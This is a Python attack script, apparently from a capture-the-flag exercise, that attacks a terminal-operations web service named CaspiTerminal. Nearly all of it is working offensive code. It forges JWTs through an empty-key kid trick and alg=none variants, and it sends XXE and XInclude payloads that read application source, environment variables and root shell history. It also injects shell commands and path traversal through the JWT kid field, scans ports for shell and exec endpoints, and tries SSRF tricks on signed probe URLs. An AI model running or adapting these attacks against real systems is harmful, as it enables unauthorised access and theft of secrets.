#!/usr/bin/env python3
"""round77 — XInclude for app.py, kid injection, history files, port 9000-9003 deep scan"""
import requests, json, time, hashlib, hmac as hm, base64

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK")
print("="*70)
healthy = False
for i in range(5):
    try:
        r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            print(f"  Server healthy: {r.text[:100]}")
            healthy = True
            break
        print(f"  [{r.status_code}]")
    except Exception as e:
        print(f"  Attempt {i+1}: {type(e).__name__}: {e}")
    time.sleep(3)

if not healthy:
    print("  WARNING: Server unreachable. Trying anyway...")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: XINCLUDE — READ app.py WITH parse='text'")
print("="*70)
print("  XInclude parse=text treats file as TEXT, not XML markup")
print("  Characters like < > & are NOT interpreted as XML")

xinclude_tests = [
    # Standard XInclude in remarks
    ("xi in remarks", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///app/app.py" parse="text"/></remarks>
</ticket>'''),

    # XInclude with fallback
    ("xi with fallback", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///app/app.py" parse="text"><xi:fallback>FALLBACK</xi:fallback></xi:include></remarks>
</ticket>'''),

    # XInclude for entrypoint.sh
    ("xi entrypoint.sh", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///app/entrypoint.sh" parse="text"/></remarks>
</ticket>'''),

    # XInclude for auth.py
    ("xi auth.py", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///app/entrypoint.sh" parse="text"/></remarks>
</ticket>'''),

    # XInclude for /proc/self/environ
    ("xi environ", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///proc/self/environ" parse="text"/></remarks>
</ticket>'''),

    # XInclude at document level
    ("xi at root", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
  <xi:include href="file:///app/app.py" parse="text"/>
</ticket>'''),

    # Try without namespace prefix
    ("include no ns", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><include href="file:///app/app.py" parse="text" xmlns="http://www.w3.org/2001/XInclude"/></remarks>
</ticket>'''),

    # XInclude for db.py as baseline (should show content we know)
    ("xi db.py baseline", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///app/db.py" parse="text"/></remarks>
</ticket>'''),
]

for desc, xml in xinclude_tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=12)
        if r.status_code == 200:
            data = r.json()
            remarks = data.get("summary", {}).get("remarks", "")
            if remarks and remarks != "R" and remarks != "FALLBACK":
                print(f"  *** XINCLUDE WORKS! {desc}: {remarks[:500]} ***")
            elif remarks == "FALLBACK":
                print(f"  {desc}: got FALLBACK (XInclude processed but file failed)")
            elif not remarks:
                print(f"  {desc}: [200] empty remarks (XInclude element ignored)")
            else:
                print(f"  {desc}: [200] remarks='{remarks}' (unchanged)")
        else:
            body = r.text[:100].replace('\n', ' ')
            print(f"  {desc}: [{r.status_code}] {body}")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.5)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: KID FIELD INJECTION (Command/Path Injection)")
print("="*70)

# If kid is processed through shell or has injectable processing
injection_kids = [
    # Command injection via shell
    ("cmd semicolon", "carrier; cat /proc/self/environ > /tmp/env.txt"),
    ("cmd pipe", "carrier | cat /proc/self/environ"),
    ("cmd backtick", "carrier`id`"),
    ("cmd dollar", "carrier$(id)"),
    ("cmd newline", "carrier\nid"),
    # Path traversal in kid resolution
    ("rel traversal", "../../../proc/self/environ"),
    ("rel keys", "../../proc/self/environ"),
    # Null byte injection (truncate path)
    ("null byte", "/etc/hostname\x00.txt"),
    # Wildcard/glob
    ("glob star", "/app/keys/*"),
    ("glob question", "/app/keys/carrie?"),
]

for desc, kid in injection_kids:
    try:
        token = jwt_forged(role="operator", kid=kid, key=b'')
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** KID INJECTION! {desc}: [{r.status_code}] {r.text[:100]} ***")
        elif r.status_code == 500:
            print(f"  [500] {desc} (server error — possible injection!)")
        # 403 is expected
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# Check if /tmp/env.txt was created by command injection
code, val = xxe_read("/tmp/env.txt", timeout=5)
if code == 200 and val:
    print(f"\n  *** /tmp/env.txt CREATED! Command injection worked! ***")
    print(f"  Content: {val[:1000]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: HISTORY + PROFILE FILES")
print("="*70)

history_paths = [
    "/root/.bash_history",
    "/root/.ash_history",
    "/root/.sh_history",
    "/root/.python_history",
    "/root/.psql_history",
    "/root/.wget-hsts",
    "/root/.lesshst",
    "/root/.viminfo",
    "/root/.nano_history",
    "/root/.config/pip/pip.conf",
    "/root/.pip/pip.conf",
    "/etc/profile",
    "/etc/bash.bashrc",
    "/etc/profile.d/color_prompt.sh",
    "/etc/skel/.bashrc",
    # Common Docker init files
    "/docker-entrypoint.sh",
    "/entrypoint.sh",
    "/start.sh",
    "/run.sh",
    "/init.sh",
    "/usr/local/bin/docker-entrypoint.sh",
    "/usr/local/bin/entrypoint.sh",
    # Python site customization
    "/usr/local/lib/python3.11/sitecustomize.py",
    "/usr/local/lib/python3.11/usercustomize.py",
    # pip installed scripts
    "/usr/local/bin/gunicorn",
    "/usr/local/bin/flask",
]

for path in history_paths:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"  *** {path} ({len(val)} bytes) ***")
        for line in val.split('\n')[:20]:
            if line.strip():
                print(f"    {line}")
    elif code == 400:
        print(f"  EXISTS(400): {path}")
    time.sleep(0.08)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: PORTS 9000-9003 DEEP SCAN")
print("="*70)

for port in [9000, 9001, 9002, 9003]:
    print(f"\n  --- Port {port} ---")

    # GET endpoints
    for path in ["/", "/healthz", "/api", "/flag", "/secret",
                 "/config", "/env", "/shell", "/probe", "/admin",
                 "/v1", "/api/v1", "/internal", "/debug",
                 "/api/config", "/api/secret", "/api/flag",
                 "/api/shell", "/api/probe", "/api/env"]:
        try:
            r = requests.get(f"http://{HOST}:{port}{path}",
                           timeout=3, allow_redirects=False)
            if r.status_code != 404:
                body = r.text[:100].replace('\n', ' ').strip()
                print(f"    GET [{r.status_code}] {path}: {body}")
        except:
            pass
        time.sleep(0.05)

    # POST to various endpoints
    for path in ["/", "/api", "/exec", "/shell", "/command",
                 "/api/exec", "/api/shell", "/api/command"]:
        try:
            r = requests.post(f"http://{HOST}:{port}{path}",
                            json={"cmd":"id"}, timeout=3)
            if r.status_code != 404:
                body = r.text[:100].replace('\n', ' ').strip()
                print(f"    POST [{r.status_code}] {path}: {body}")
        except:
            pass
        time.sleep(0.05)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: ISO-8859-1 ENCODING XXE FOR BINARY FILES")
print("="*70)
print("  Try reading .pyc files with Latin-1 encoding")
print("  (avoids UTF-8 validation but < and & still break XML)")

# Try reading entrypoint.sh with ISO-8859-1
for path in ["/app/entrypoint.sh", "/app/auth.py"]:
    xml = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml.encode('iso-8859-1'),
            headers={**AUTH_OP, "Content-Type":"application/xml; charset=ISO-8859-1"},
            timeout=10)
        if r.status_code == 200:
            data = r.json()
            remarks = data.get("summary", {}).get("remarks", "")
            if remarks:
                print(f"  *** ISO-8859-1 WORKS! {path}: {remarks[:500]} ***")
            else:
                print(f"  {path}: [200] empty")
        else:
            print(f"  {path}: [{r.status_code}]")
    except Exception as e:
        print(f"  {path}: {e}")
    time.sleep(0.5)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE RESPONSE HEADERS ANALYSIS")
print("="*70)
print("  Check what headers CaspiTerminal sends with probe response")

url1 = "http://gauge-gw.internal:9100/v1/tanks/1/level"
sig1 = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

try:
    r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url1, "sig": sig1},
                     headers=AUTH_OP, timeout=10)
    print(f"  Status: {r.status_code}")
    print(f"  Response headers:")
    for k, v in r.headers.items():
        print(f"    {k}: {v}")
    print(f"  Body: {r.text[:300]}")

    # Also check if probe response includes raw response headers
    data = r.json()
    for key in data:
        if key not in ['body', 'status']:
            print(f"  *** Extra field: {key} = {data[key]} ***")
except Exception as e:
    print(f"  {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: DIFFERENT JWT ALGORITHMS")
print("="*70)

# Try alg=none (no signature)
for alg in ["none", "None", "NONE", "nOnE"]:
    h = json.dumps({"alg":alg,"typ":"JWT"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    token = b64u(h)+'.'+b64u(p)+'.'
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** ALG={alg} BYPASS! [{r.status_code}] {r.text[:100]} ***")
        elif r.status_code == 500:
            print(f"  alg={alg}: [500] (server error)")
    except Exception as e:
        print(f"  alg={alg}: {e}")
    time.sleep(0.3)

# Try alg=HS512 with kid=/dev/null (empty key)
for alg_name, alg_hash in [("HS384", "sha384"), ("HS512", "sha512")]:
    h = json.dumps({"alg":alg_name,"typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    sig = b64u(hm.new(b'', m.encode(), alg_hash).digest())
    token = m+'.'+sig
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** {alg_name} WORKS! [{r.status_code}] {r.text[:100]} ***")
    except:
        pass
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: PROBE — SEND ARBITRARY REQUESTS TO gauge-gw")
print("="*70)
print("  Using ALL 5 signed probes to check for extra data")

probes = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    ("tk-02", "http://gauge-gw.internal:9100/v1/tanks/2/level",
     "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    ("tk-03", "http://gauge-gw.internal:9100/v1/tanks/3/level",
     "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    ("tk-07", "http://gauge-gw.internal:9100/v1/tanks/7/level",
     "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
]

for device, url, sig in probes:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe",
                         json={"url": url, "sig": sig},
                         headers=AUTH_OP, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(f"  {device}: {json.dumps(data)}")
    except Exception as e:
        print(f"  {device}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CREATIVE — SSRF WITH KNOWN SIGS TO DIFFERENT URLS")
print("="*70)
print("  What if the URL validator strips/modifies the URL before HMAC?")
print("  Test URL normalization edge cases")

# Test: What if the server normalizes the URL (strips whitespace, etc)?
url_tricks = [
    ("space prefix", " " + probes[1][1], probes[1][2]),
    ("space suffix", probes[1][1] + " ", probes[1][2]),
    ("tab prefix", "\t" + probes[1][1], probes[1][2]),
    ("newline prefix", "\n" + probes[1][1], probes[1][2]),
    ("url encode", probes[1][1].replace("/", "%2F"), probes[1][2]),
    ("double scheme", "http://http://gauge-gw.internal:9100/v1/tanks/1/level", probes[1][2]),
    ("no port", probes[1][1].replace(":9100", ""), probes[1][2]),
    ("port 80", probes[1][1].replace(":9100", ":80"), probes[1][2]),
    ("@ auth", "http://user:pass@gauge-gw.internal:9100/v1/tanks/1/level", probes[1][2]),
]

for desc, url, sig in url_tricks:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url, "sig": sig},
                         headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            print(f"  *** ACCEPTED! {desc}: {r.text[:100]}")
        elif r.status_code == 500:
            print(f"  [500] {desc}")
    except:
        pass
    time.sleep(0.2)

print("  (Only 200/500 shown, 403 = expected)")

print("\n"+"="*70)
print("DONE")
print("="*70)
